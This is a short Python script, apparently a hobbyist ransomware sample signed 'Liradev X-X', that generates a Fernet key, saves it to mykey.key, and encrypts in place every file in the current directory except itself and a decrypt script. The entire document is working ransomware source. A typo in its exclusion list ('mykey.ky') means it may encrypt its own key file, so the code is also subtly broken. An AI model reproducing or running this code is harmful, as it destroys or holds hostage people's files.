import os
from cryptography.fernet import Fernet

key = Fernet.generate_key()

allFiles = []

for file in os.listdir():
    if file == "mykey.ky" or file == "ransomware.py" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        allFiles.append(file)
print(f'Files encrypted: {allFiles}')

with open("mykey.key", "wb") as mykey:
    mykey.write(key)
    
for file in allFiles:
    with open(file, "rb") as readFileMode:
        readFile = readFileMode.read()
        encryptedFile = Fernet(key).encrypt(readFile)
    with open(file, "wb") as writeFileMode:
        writeFileMode.write(encryptedFile)

print("All files encrypteds by Liradev X-X")